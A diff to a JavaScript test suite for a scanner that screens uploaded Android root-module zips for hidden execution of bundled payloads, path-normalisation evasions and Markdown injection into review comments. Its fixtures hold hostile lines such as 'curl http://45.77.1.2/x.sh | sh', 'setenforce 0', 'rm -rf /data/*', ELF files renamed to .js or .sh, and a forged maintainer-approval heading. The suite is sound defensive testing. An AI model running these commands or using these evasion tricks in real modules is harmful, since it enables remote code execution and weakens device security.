@@ -17,7 +17,7 @@ import {
   MAX_TEXT, MAX_ENTRIES, MAX_RATIO,
   EXEC_BUNDLED_FILE,
 } from './risk-rules.mjs';
-import { scanZip, classify, renderMarkdown, renderJSON, mask, resolveChangeType, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip, resolveBundledTargets } from './scan.mjs';
+import { scanZip, classify, renderMarkdown, renderJSON, mask, resolveChangeType, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip, resolveBundledTargets, resolveBundledRefs, normalizeRefPath, EXEC_UNRESOLVED_ADVICE } from './scan.mjs';
 import { makeModuleZip, moduleProp, scanToReport } from './fixtures.mjs';
 
 // ---------------------------------------------------------------------------
@@ -649,6 +649,25 @@ test('端到端：把 ELF 改名成 config.js 也只能落到「二进制」，�
     JSON.stringify(r.findings.map((f) => f.ruleId)));
   assert.deepEqual(r.binaries.map((b) => b.name), ['config.js']);
   assert.ok(!r.scripts.some((s) => s.name === 'config.js'), '机器码不进「全文」一节，否则 PR 评论会被灌满');
+
+  // 评审 fix1-③：上面那句「不进全文」只是因为没人引用才没红 —— 它压根不在扫描面里。
+  // 真被 sh 引用时它必须进扫描面（该扫的照扫），但渲染面只许给有界预览：删掉渲染守卫这条就红。
+  const p2 = writeZip('disguise-referenced.zip', [
+    { name: 'module.prop', content: CLEAN_PROP },
+    { name: 'customize.sh', content: '#!/system/bin/sh\nsh $MODDIR/config.js\n' },
+    { name: 'config.js', content: elf },
+  ]);
+  const r2 = scanZip(p2, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  assert.deepEqual(r2.escalated.map((e) => e.resolvedEntry), ['config.js'], '被引用就要进扫描面');
+  const row2 = r2.scripts.find((s) => s.name === 'config.js');
+  assert.ok(row2, '升级条目要在人看得见的清单里（F11）');
+  assert.equal(row2.nonText, true, '非文本要标出来');
+  assert.equal(row2.contentKind, 'non-text-preview', '预览要说明它不是全文');
+  const NUL = String.fromCharCode(0);
+  assert.ok(!row2.content.includes(NUL), '机器码不进全文 —— 删掉渲染守卫这一句就红');
+  assert.ok(row2.content.length < 1000, '必须是有限预览，实际 ' + row2.content.length + ' 字符');
+  assert.ok(!renderMarkdown(r2).includes(NUL), 'md 里也不许有 NUL');
+  assert.equal(r2.riskLevel, 'high', '改名成 .js 的 ELF 被引用时必须 high');
 });
 
 test('端到端：payload 藏在 512 KB 之后照样被行级规则命中，同时报覆盖度缺口', () => {
@@ -775,28 +794,77 @@ test('EXEC_BUNDLED_FILE：脚本执行包内非扫描面条目 → high，且那
   assert.ok(r.scripts.some((s) => s.name === 'stage.dat'), '被升级的条目必须进 report.scripts');
 });
 
-test('EXEC_BUNDLED_FILE：$MODDIR 与 . source 形式同样命中；已扫描的 .sh 目标不算', async () => {
-  // 三条都是实测形状：前两条今天整条规则不咬（F5），第三条是合法模块的常规写法（F6）
-  const hits = [['sh $MODDIR/x.dat'], ['bash ${MODDIR}/payload'], ['. $MODDIR/lib.sh.bin'], ['busybox sh $MODDIR/x.bin'], ['source ${MODPATH}/run.zsh'], ['sh "/data/adb/modules/a/payload.bin"']];
-  for (const [line] of hits) assert.ok(EXEC_BUNDLED_FILE.scan('service.sh', line).length, line);
-  for (const line of ['sh $MODPATH/install.sh', 'bash ${MODDIR}/lib.sh', '. $MODDIR/common.sh',
-    'sh /data/adb/modules/eval.t1/hooks.sh', 'sh /system/bin/foo', 'echo $MODPATH/x']) {
+test('EXEC_BUNDLED_FILE：引用形态矩阵 —— 检测层要认得全部写法，包括改名机器码与同行复合', () => {
+  // 这一条只管「检测」：规则是纯逐行函数，拿不到扫描面，所以它不该替「那个文件是否已被扫过」说话。
+  // 「目标已逐行扫过就不报」的撤销判据在 scanZip 里（见下面那条端到端用例）—— 评审 fix1-① 的修法。
+  for (const line of [
+    // 简报 Step 1 的 6 例
+    'sh $MODDIR/x.dat', 'bash ${MODDIR}/payload', '. $MODDIR/lib.sh.bin',
+    'busybox sh $MODDIR/x.bin', 'source ${MODPATH}/run.zsh', 'sh "/data/adb/modules/a/payload.bin"',
+    // 简报 Step 3 注释点名要认的 3 例
+    'sh $TMPMODDIR/stage2.dat', 'sh $MODPATH/bin/payload', 'sh /data/adb/modules/eval.t1/stage.dat',
+    // fix1-①：改名成脚本后缀的机器码。后缀不是「已扫过」的证据，所以这里必须命中。
+    'sh $MODDIR/payload.js', 'sh $MODDIR/payload.sh', 'sh $MODPATH/late.js',
+    'sh $MODDIR/cfg.prop', 'busybox sh ${MODDIR}/hook.lua',
+    // fix1-②：同一行不许自我豁免（两个引用一个合法一个恶意，恶意那个必须报）
+    'sh $MODDIR/payload.dat && sh $MODDIR/install.sh',
+    'sh $MODDIR/install.sh && sh $MODDIR/payload.dat',
+    'sh $MODDIR/payload.dat  # 这行只是调用 install.sh 的包装',
+    // fix1-④：一律不许豁免的逃逸写法
+    'echo hi sh $MODDIR/x.bin', '. $MODDIR/functions', "sh '$MODDIR/lib.dat'",
+    'sh${IFS}$MODDIR/x.bin', '$MODDIR/tool.bin', '  "$MODDIR/tool.bin" --help',
+    'do_thing || $MODDIR/stage2.bin', 'cd /; sh $MODDIR/x.bin',
+    // fix1-⑤：要归一化的形状，先得能被检测
+    'sh $MODDIR//x.dat', 'sh $MODDIR/sub/../x.dat', 'sh $MODDIR/sub/./x.dat',
+    'sh $MODDIR\\sub\\x.dat', 'sh $MODDIR/X.DAT', 'sh $MODDIR/ghost.dat',
+  ]) {
+    assert.ok(EXEC_BUNDLED_FILE.scan('service.sh', line).length > 0, line);
+  }
+  // 不是「执行包内另一个文件」的形状，以及注释行（fix1-④ 的豁免，按本仓 /^\s*#/ 先例）
+  for (const line of [
+    'sh /system/bin/foo', 'echo $MODPATH/x', 'cp -f busybox $MODPATH/system/xbin/bb',
+    'rm -rf $MODDIR/system/app/Foo', 'export PATH=$MODDIR/bin:$PATH',
+    '[ -f $MODDIR/data.dat ] && echo ok', 'SKIPUNINSTALL=1', '# sh $MODDIR/tool.bin',
+    '  #  sh $MODDIR/tool.bin', '#!/system/bin/sh',
+  ]) {
     assert.equal(EXEC_BUNDLED_FILE.scan('service.sh', line).length, 0, line);
   }
-  assert.equal(EXEC_BUNDLED_FILE.scan('service.sh', 'sh $MODPATH/install.sh').length, 0,
-    'install.sh 是已在扫描面里的 .sh：它已经被逐行扫过，把它抬到 high 只会淹没人工队列'
-    + '（scan.test.mjs:97 就是把这个形状当良性写的）');
 });
 
-test('EXEC_BUNDLED_FILE：补齐简报注释所称的 16 例（$TMPMODDIR、子目录、.js 边界）', () => {
-  // 上面那条是简报 Step 1 的 12 例（6 命中 / 6 不命中）原样收进来；
-  // 这里补的是 Step 3 注释里点名要认的另外三种形状，凑满「9 应命中 / 7 应不命中」。
-  for (const line of ['sh $TMPMODDIR/stage2.dat', 'sh $MODPATH/bin/payload', 'sh /data/adb/modules/eval.t1/stage.dat']) {
-    assert.ok(EXEC_BUNDLED_FILE.scan('service.sh', line).length, line);
-  }
-  for (const line of ['sh $MODPATH/late.js', 'sh $MODDIR/cfg.prop', 'busybox sh ${MODDIR}/hook.lua']) {
-    assert.equal(EXEC_BUNDLED_FILE.scan('service.sh', line).length, 0, line);
-  }
+test('EXEC_BUNDLED_FILE：撤销判据是「它真的在扫描面里」，不是后缀像不像脚本', async () => {
+  // 正经模块的常规写法：install.sh 确实被逐行扫过 -> 这条 high 撤掉，别淹没人工队列。
+  const ok = makeModuleZip({ id: 'eval.t1ok', files: [
+    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/install.sh\nbash ${MODDIR}/lib.sh\n'],
+    ['install.sh', 'echo install\n'],
+    ['lib.sh', 'echo lib\n'],
+  ]});
+  const r1 = await scanToReport(ok, { changeType: 'first' });
+  assert.deepEqual(r1.escalated, [], '目标已在扫描面里，不该被当成新条目升级');
+  assert.ok(!r1.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
+    JSON.stringify(r1.findings.map((f) => f.ruleId)));
+  assert.equal(r1.riskLevel, 'low', JSON.stringify(r1.findings));
+  assert.equal(r1.decision.action, 'auto-approve', '多文件正经模块不能被这条规则抬成人工队列');
+
+  // 同一个形状，但那个 .sh 不在包里（运行期才写出来）：解析不到 -> 照报 high，且不许承诺读过
+  const ghost = makeModuleZip({ id: 'eval.t1ghost', files: [
+    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/install.sh\n'],
+  ]});
+  const r2 = await scanToReport(ghost, { changeType: 'first' });
+  assert.ok(r2.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
+    '包内不存在的引用仍然要人工读（fail-closed：多拦可申诉）');
+  assert.equal(r2.riskLevel, 'high');
+
+  // 后缀是 .sh 但内容是机器码（魔数赢过后缀）-> 它其实不在扫描面里 -> 必须报、必须升级
+  const renamed = makeModuleZip({ id: 'eval.t1ren', files: [
+    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/install.sh\n'],
+    ['install.sh', Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'),
+      Buffer.from([0, 0]), Buffer.from('setenforce 0\n', 'utf8'), Buffer.alloc(200, 0)])],
+  ]});
+  const r3 = await scanToReport(renamed, { changeType: 'first' });
+  assert.deepEqual(r3.escalated.map((e) => e.resolvedEntry), ['install.sh'],
+    '同一个后缀，另一条假设（已扫过）不成立时必须升级');
+  assert.ok(r3.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'));
+  assert.equal(r3.riskLevel, 'high');
 });
 
 test('EXEC_BUNDLED_FILE：规则要接进规则表、分类有中文标签、且 high 参与定级', () => {
@@ -832,11 +900,17 @@ test('resolveBundledTargets：只认包内真实存在、大小写原样、且�
   // 已在扫描面里的不重复追加
   assert.deepEqual(resolveBundledTargets([targets[0], files[1]], files, 'eval.t1'), [],
     '已在扫描面里的条目不再取一次，否则同一份内容被扫两遍');
-  // 已是被扫描的文本后缀（.sh/.lua/.js/.prop）不再升级
-  const shTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' }];
-  const shFiles = [...shTargets, { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
-  assert.deepEqual(resolveBundledTargets(shTargets, shFiles, 'm').map((e) => e.name), [],
-    'helper.sh 本来就在行级规则覆盖范围内，不需要由这条规则说话');
+  // 「文本后缀就不再升级」这条旧判据已被评审 fix1-① 否掉：后缀不代表已扫过。
+  // 换成看扫描面成员 —— helper.sh 真在扫描面里时不重复取，不在时（例如它是改名成 .sh 的机器码，
+  // classify 把它落到 binaries）必须取进来。
+  const realTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' },
+    { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
+  assert.deepEqual(resolveBundledTargets(realTargets, realTargets, 'm').map((e) => e.name), [],
+    '已在扫描面里的 .sh 不再取一次，否则同一份内容被扫两遍');
+  const disguisedTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' }];
+  const disguisedFiles = [...disguisedTargets, { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
+  assert.deepEqual(resolveBundledTargets(disguisedTargets, disguisedFiles, 'm').map((e) => e.name),
+    ['helper.sh'], '后缀是 .sh 但确实不在扫描面里时，它就没被逐行扫过 —— 必须升级');
   // 指向别的模块目录的绝对路径不算包内条目
   const other = [{ name: 'service.sh', content: 'sh /data/adb/modules/other_mod/x.dat\n' }];
   assert.deepEqual(resolveBundledTargets(other, files, 'eval.t1'), [],
@@ -913,6 +987,228 @@ test('端到端：升级链路在报告里看得见（escalated + inventory + Ma
   assert.match(md, /## 脚本全文[\s\S]*curl http:\/\/45\.77\.1\.2\/x\.sh \| sh/);
   const j = JSON.parse(renderJSON(r));
   assert.deepEqual(j.escalated, r.escalated, 'escalated 是报告字段，不是 finding，JSON 里原样保留');
+});
+
+/** ELF 头 + 埋一行明文给行级规则读 + 补零：魔数是机器码，名字随用例挑 */
+function elfWith(text, pad = 200) {
+  return Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.from([0, 0]),
+    Buffer.from(text, 'utf8'), Buffer.alloc(pad, 0)]);
+}
+
+/**
+ * 按 CommonMark/GitHub 语义走一遍 Markdown，返回落在代码围栏「之外」的标题行。
+ * 开栏长度 n，只有整行反引号数 >= n 才闭栏 —— 围栏体内的一切都不参与渲染。
+ */
+function headingsOutsideFence(md) {
+  let fence = 0;
+  const out = [];
+  for (const line of String(md).split(/\r?\n/)) {
+    const m = line.match(/^ {0,3}(`{3,})([^`]*)$/);
+    if (m) {
+      if (fence === 0) fence = m[1].length;
+      else if (m[1].length >= fence) fence = 0;
+      continue;
+    }
+    if (fence === 0 && /^#{1,6}\s/.test(line)) out.push(line);
+  }
+  return out;
+}
+
+test('fix1-①：改名成 .js / .sh 的 ELF 被 sh 引用时闸不再静默失效（升级 + 逐行扫 + high）', async () => {
+  for (const name of ['payload.js', 'payload.sh']) {
+    const zip = makeModuleZip({ id: 'eval.h1', files: [
+      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/' + name + '\n'],
+      [name, elfWith('setenforce 0\n')],
+    ]});
+    const r = await scanToReport(zip, { changeType: 'first' });
+    const ids = r.findings.map((f) => f.ruleId);
+    assert.ok(r.binaries.some((b) => b.name === name), 'classify 认它是二进制（魔数赢过后缀）');
+    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [name], '评审实测 escalated 曾是 []');
+    const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
+    assert.ok(sel, '该内容必须进行级扫描（评审实测一行都没扫）');
+    assert.equal(sel.file, name);
+    assert.equal(sel.line, 1);
+    assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
+    assert.equal(r.riskLevel, 'high', '评审实测这里曾只有 medium');
+    assert.equal(r.decision.action, 'block');
+  }
+});
+
+test('fix1-②：同一行不许自我豁免 —— 两个引用一个合法一个恶意，恶意那个必须报', async () => {
+  for (const ref of [
+    'sh $MODDIR/payload.dat && sh $MODDIR/install.sh',
+    'sh $MODDIR/install.sh && sh $MODDIR/payload.dat',
+    'sh $MODDIR/payload.dat  # 这行只是调用 install.sh 的包装',
+  ]) {
+    const zip = makeModuleZip({ id: 'eval.h2', files: [
+      ['service.sh', '#!/system/bin/sh\n' + ref + '\n'],
+      ['install.sh', 'echo install\n'],
+      ['payload.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
+    ]});
+    const r = await scanToReport(zip, { changeType: 'first' });
+    const ids = r.findings.map((f) => f.ruleId);
+    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.dat'], ref);
+    assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ref);
+    assert.ok(ids.includes('PIPE_TO_SHELL'), '载荷必须按文本再扫一遍');
+    assert.equal(r.findings.find((f) => f.ruleId === 'PIPE_TO_SHELL').file, 'payload.dat');
+    assert.equal(r.riskLevel, 'high', ref + ' —— 评审实测曾是 0 命中 / low');
+    // install.sh 已被逐行扫过，不该由它说话：snippet 要指向真正没被扫过的载荷
+    assert.match(r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE').snippet, /payload\.dat/);
+  }
+});
+
+test('fix1-③：升级进来的非文本条目只给有界预览，机器码不进全文与产物', async () => {
+  const blob = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.alloc(1024 * 1024, 0)]);
+  const zip = makeModuleZip({ id: 'eval.h3', files: [
+    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.conf\n'],
+    ['payload.conf', blob],
+  ]});
+  const r = await scanToReport(zip, { changeType: 'first' });
+  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.conf'],
+    '扫描面与渲染面分开：不许为了渲染方便把它退回名单外');
+  const row = r.scripts.find((s) => s.name === 'payload.conf');
+  assert.ok(row, '它还得在人看得见的清单里（F11）');
+  assert.equal(row.nonText, true);
+  assert.equal(row.contentKind, 'non-text-preview');
+  assert.ok(row.nulCount > 100000, '预览要报出 NUL 个数，实际 ' + row.nulCount);
+  assert.ok(!row.content.includes('\u0000'), '正文里不许有 NUL');
+  assert.ok(row.content.length < 1000, '必须是有限预览，实际 ' + row.content.length + ' 字符');
+  assert.match(row.content, /内容非文本/);
+  assert.match(row.content, /7f 45 4c 46/);
+  const md = renderMarkdown(r);
+  const json = renderJSON(r);
+  assert.ok(Buffer.byteLength(md) < 32 * 1024, 'md 曾被灌成 1.03 MB，实际 ' + Buffer.byteLength(md) + ' B');
+  assert.ok(!md.includes('\u0000'), 'md 曾被灌成 52 万个 NUL');
+  assert.ok(Buffer.byteLength(json) < 64 * 1024, 'json 曾被灌成 50 MB，实际 ' + Buffer.byteLength(json) + ' B');
+  assert.match(md, /非文本：只给有界预览/);
+});
+
+test('fix1-③：围栏体里的反引号关不掉公开评论的围栏 —— 投稿者写的假标题不外漏', async () => {
+  const evil = '#!/system/bin/sh\nsh $MODDIR/tool.bin\n```\n\n## 已由维护者批准 ✅\n\n无需人工复核\n````\n';
+  const zip = makeModuleZip({ id: 'eval.h3b', files: [
+    ['service.sh', evil],
+    ['tool.bin', elfWith('setenforce 0\n')],
+  ]});
+  const r = await scanToReport(zip, { changeType: 'first' });
+  const md = renderMarkdown(r);
+  const outside = headingsOutsideFence(md);
+  assert.ok(!outside.some((l) => l.includes('已由维护者批准')),
+    '注入的假标题被当成报告自己的标题渲染了：' + JSON.stringify(outside.slice(0, 8)));
+  // 开栏/闭栏的长度要压过正文里最长的反引号串（这里是 4 个），否则正文的 ``` 能提前闭栏
+  const opener = md.match(/^(`{3,})sh$/m);
+  assert.ok(opener, '「脚本全文」一节要有以 sh 标注的开栏');
+  assert.ok(opener[1].length > 4,
+    '开栏长度必须压过正文里最长的反引号串，实际 ' + opener[1].length + ' 个');
+  assert.ok(md.includes('## 已由维护者批准'), '显示层防护不许吃掉原文（人工要看的就是原文）');
+});
+
+test('fix1-④：注释行豁免；echo / source / 单引号 / ${IFS} / 直接执行一律不许豁免', async () => {
+  // 注释里的引用不是执行 —— 按本仓 /^\s*#/ 的既有先例不报 high（评审实测它曾报 high，是误伤）。
+  const commented = makeModuleZip({ id: 'eval.h4a', files: [
+    ['service.sh', '#!/system/bin/sh\n# sh $MODDIR/notes.dat\nexit 0\n'],
+    ['notes.dat', 'echo documented\n'],
+  ]});
+  const a = await scanToReport(commented, { changeType: 'first' });
+  assert.ok(!a.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
+    JSON.stringify(a.findings.map((f) => f.ruleId)));
+  assert.equal(a.riskLevel, 'low', JSON.stringify(a.findings));
+  assert.deepEqual(a.escalated.map((e) => e.resolvedEntry), ['notes.dat'],
+    '豁免只作用于「报不报」；被引用的条目照样进扫描面，别把注释当免检通道');
+
+  for (const [line, want] of [
+    ['echo hi sh $MODDIR/x.dat', 'x.dat'],
+    ['. $MODDIR/functions', 'functions'],
+    ["sh '$MODDIR/lib.dat'", 'lib.dat'],
+    ['sh${IFS}$MODDIR/x.bin', 'x.bin'],
+    ['$MODDIR/tool.bin', 'tool.bin'],
+    ['do_thing || $MODDIR/stage2.bin', 'stage2.bin'],
+  ]) {
+    const zip = makeModuleZip({ id: 'eval.h4b', files: [
+      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
+      [want, 'echo payload\n'],
+    ]});
+    const r = await scanToReport(zip, { changeType: 'first' });
+    assert.ok(r.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'), line + ' 必须报');
+    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [want], line + ' 必须升级 ' + want);
+    assert.equal(r.riskLevel, 'high', line);
+  }
+});
+
+test('fix1-⑤：归一化覆盖 //、..、.、反斜杠、大小写变体', async () => {
+  assert.equal(normalizeRefPath('sub/../x.dat'), 'x.dat');
+  assert.equal(normalizeRefPath('sub/./x.dat'), 'sub/x.dat');
+  assert.equal(normalizeRefPath('//x.dat'), 'x.dat');
+  assert.equal(normalizeRefPath('sub\\..\\x.dat'), 'x.dat');
+  assert.equal(normalizeRefPath('../escape.dat'), null, '上跳越出模块根目录的不算包内条目');
+
+  for (const [line, want] of [
+    ['sh $MODDIR//norm.dat', 'norm.dat'],
+    ['sh $MODDIR/sub/../norm.dat', 'norm.dat'],
+    ['sh $MODDIR/./norm.dat', 'norm.dat'],
+    ['sh $MODDIR\\sub\\inner.dat', 'sub/inner.dat'],
+    ['sh $MODDIR/NORM.DAT', 'norm.dat'],
+  ]) {
+    const zip = makeModuleZip({ id: 'eval.h5', files: [
+      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
+      ['norm.dat', 'setenforce 0\n'],
+      ['sub/inner.dat', 'setenforce 0\n'],
+    ]});
+    const r = await scanToReport(zip, { changeType: 'first' });
+    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [want], line + ' → ' + want);
+    const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
+    assert.equal(f.advice, EXEC_BUNDLED_FILE.advice, '解析到并读过了，才允许保留「读一遍」那句承诺');
+    assert.ok(r.findings.some((x) => x.ruleId === 'SELINUX_DISABLE' && x.file === want),
+      '归一化之后要真的把那个条目读了：' + line);
+  }
+});
+
+test('fix1-⑤：归一化后仍解析不到时，报告不许承诺它没做到的事', async () => {
+  for (const line of ['sh $MODDIR/ghost.dat', 'sh $MODDIR/../escape.dat', 'sh $MODDIR/$SUB/x.dat']) {
+    const zip = makeModuleZip({ id: 'eval.h5b', files: [
+      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
+      ['x.dat', 'setenforce 0\n'],
+    ]});
+    const r = await scanToReport(zip, { changeType: 'first' });
+    assert.deepEqual(r.escalated, [], line + ' 解析不到条目，不该假装升级');
+    const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
+    assert.ok(f, line + ' 仍要报（fail-closed：多拦可申诉）');
+    assert.equal(f.advice, EXEC_UNRESOLVED_ADVICE);
+    assert.ok(!f.advice.includes('读一遍'), '不许在报告里说「把那个文件也读一遍」而实际没读');
+    assert.equal(r.riskLevel, 'high', line);
+  }
+});
+
+test('fix1-⑥：同一载荷被多种写法引用只升级一次；同名不同内容的重复条目全都要扫', async () => {
+  const once = makeModuleZip({ id: 'eval.h6a', files: [
+    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.dat\nsh $MODDIR//payload.dat\nbash ${MODDIR}/payload.dat\n'],
+    ['payload.dat', 'echo one\n'],
+  ]});
+  const a = await scanToReport(once, { changeType: 'first' });
+  assert.equal(a.escalated.length, 1, '三种写法指向同一份内容，扫描面里只能有一份');
+  assert.equal(a.scripts.filter((s) => s.name === 'payload.dat').length, 1);
+  assert.equal(a.inventory.escalated.length, 1);
+
+  // 同名重复条目：两份内容都得进扫描面，否则「放两份同名、审核读干净那份」正是这条闸要拦的手法
+  const dup = makeModuleZip({ id: 'eval.h6b', files: [
+    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/dup.dat\n'],
+    ['dup.dat', 'setenforce 0\n'],
+    ['dup.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
+  ]});
+  const b = await scanToReport(dup, { changeType: 'first' });
+  assert.deepEqual(b.escalated.map((e) => e.resolvedEntry), ['dup.dat', 'dup.dat'],
+    '同名不同内容的两份都要升级；去重只去「内容相同」的那一类');
+  const ids = b.findings.map((f) => f.ruleId);
+  assert.ok(ids.includes('SELINUX_DISABLE') && ids.includes('PIPE_TO_SHELL'), ids.join(','));
+  assert.ok(ids.includes('STRUCT_DUPLICATE_NAME'), ids.join(','));
+
+  // 内容完全相同的重复条目只扫一遍，别把产物灌两遍
+  const same = makeModuleZip({ id: 'eval.h6c', files: [
+    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/same.dat\nsh $MODDIR//same.dat\n'],
+    ['same.dat', 'echo same\n'],
+    ['same.dat', 'echo same\n'],
+  ]});
+  const c = await scanToReport(same, { changeType: 'first' });
+  assert.equal(c.escalated.length, 1, '同名的两份同内容条目算一份，扫描面里不许出现两遍');
 });
 
 test('fixtures：干净模块带 changeType: first 仍可自动放行，不带 opts 则不可达（F15）', async () => {
